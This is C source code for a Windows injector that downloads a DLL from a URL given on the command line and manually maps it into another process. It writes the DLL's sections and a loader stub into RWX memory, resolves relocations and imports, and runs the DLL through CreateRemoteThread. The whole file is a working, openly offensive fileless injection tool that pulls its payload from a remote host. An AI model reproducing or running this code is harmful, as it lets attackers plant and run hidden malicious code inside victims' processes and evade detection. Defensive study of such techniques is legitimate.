#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>

typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

// Dll main typedef so that we can invoke it properly from the injector
typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);

typedef struct
{
	LPVOID ImageBase;

	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseReloc;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;

} RemoteData;

// Called in the remote process to handle image relocations and imports
DWORD __stdcall LibraryLoader(LPVOID Memory)
{

	RemoteData* remoteParams = (RemoteData*)Memory;

	PIMAGE_BASE_RELOCATION pIBR = remoteParams->BaseReloc;

	DWORD64 delta = (DWORD64)((LPBYTE)remoteParams->ImageBase - remoteParams->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta

	// Iterate over relocations
	while (pIBR->VirtualAddress)
	{
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(DWORD);
			PWORD list = (PWORD)(pIBR + 1);

			for (int i = 0; i < count; i++)
			{
				if (list[i])
				{
					PDWORD64 ptr = (PDWORD64)((LPBYTE)remoteParams->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
					*ptr += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
	}

	PIMAGE_IMPORT_DESCRIPTOR pIID = remoteParams->ImportDirectory;

	// Resolve DLL imports
	while (pIID->Characteristics)
	{
		PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)remoteParams->ImageBase + pIID->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)remoteParams->ImageBase + pIID->FirstThunk);

		HMODULE hModule = remoteParams->fnLoadLibraryA((LPCSTR)remoteParams->ImageBase + pIID->Name);

		if (!hModule)
			return FALSE;

		while (OrigFirstThunk->u1.AddressOfData)
		{
			if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// Import by ordinal
				DWORD64 Function = (DWORD64)remoteParams->fnGetProcAddress(hModule,
					(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			else
			{
				// Import by name
				PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)remoteParams->ImageBase + OrigFirstThunk->u1.AddressOfData);
				DWORD64 Function = (DWORD64)remoteParams->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);
				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			OrigFirstThunk++;
			FirstThunk++;
		}
		pIID++;
	}

	// Finally call cast our entry point address to our dllMain typedef
	if (remoteParams->NtHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		dllmain EntryPoint = (dllmain)((LPBYTE)remoteParams->ImageBase + remoteParams->NtHeaders->OptionalHeader.AddressOfEntryPoint);

		return EntryPoint((HMODULE)remoteParams->ImageBase, DLL_PROCESS_ATTACH, NULL); // Call the entry point
	}
	return TRUE;
}

DWORD __stdcall stub()
{
	return 0;
}



int my_atoi(char* str)
{
    int sum = 0;
    while (*str != '\0' && (*str <= '9' && *str >= '0'))
    {
        sum = sum * 10 + *str - '0';
        str++;
    }
    return sum;
}

int main(int argc, char* argv[]) 
{


	if(argc < 3)
	{
		printf("[*] Usage: %s <pid> <url_dll_path>\n", argv[0]);
		return 1;
	}

	RemoteData remoteParams;

	int procId = my_atoi(argv[1]);
	HINTERNET hSession;
	PVOID dllBuffer = NULL;
	DWORD sizeBuffer = 0;
    	DWORD dwSize = sizeof(DWORD);

	hSession = InternetOpenA("Msvcrt", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hSession != NULL)
	{
		HINTERNET hRequest;
		hRequest = InternetOpenUrlA(hSession, argv[2], NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if (hRequest != NULL)
		{
			// Get Respone Header Content-Length

			if (HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &sizeBuffer, &dwSize, NULL))
			{
				//printf("[+] Respone Content-Length: %lu\n", sizeBuffer);
				dllBuffer = (PVOID)LocalAlloc(LPTR, sizeBuffer);
				if (dllBuffer != NULL)
				{
					DWORD dwBytesRead;
					if (!InternetReadFile(hRequest, dllBuffer, sizeBuffer, &dwBytesRead))
					{
						printf("[-] Read RemoteFile %s Error\n", argv[2]);
						return 1;
					}

				}
			}

			InternetCloseHandle(hRequest);
		}

		InternetCloseHandle(hSession);
	}

	printf("[+] DLL Size %lu\n", sizeBuffer);
	printf("[+] Opening handle to process ID: %d\n", procId);

	// Get DOS Header
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	// Find the NT Header from the e_lfanew attribute
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)dllBuffer + pDosHeader->e_lfanew);

	// Open a proc use less perms for an actual operation
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);

		// Allocate a section of memory the size of the dll
	PVOID pModAddress = VirtualAllocEx(hProc, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// Write the headers to the remote process
	WriteProcessMemory(hProc, pModAddress, dllBuffer,
		pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// Copying sections of the dll to the target process
	PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		WriteProcessMemory(hProc, (PVOID)((LPBYTE)pModAddress + pSectHeader[i].VirtualAddress),
			(PVOID)((LPBYTE)dllBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
	}

	// Allocating memory for the loader code.
	PVOID loaderMem = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// Assign values to remote struct
	remoteParams.ImageBase = pModAddress;
	remoteParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pModAddress + pDosHeader->e_lfanew);

	remoteParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)pModAddress
		+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	remoteParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pModAddress
		+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	remoteParams.fnLoadLibraryA = LoadLibraryA;
	remoteParams.fnGetProcAddress = GetProcAddress;

	// Write remote attributes to the process for our loader code to use
	WriteProcessMemory(hProc, loaderMem, &remoteParams, sizeof(RemoteData), NULL);
	WriteProcessMemory(hProc, (PVOID)((RemoteData*)loaderMem + 1), LibraryLoader,
		(DWORD64)stub - (DWORD64)LibraryLoader, NULL);

	// Create a remote thread in the process and start execution at the loader function
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)((RemoteData*)loaderMem + 1),
		loaderMem, 0, NULL);

	printf("[+] Finished injecting DLL.\n");

	CloseHandle(hProc);
	LocalFree(dllBuffer);
	return 0;
}
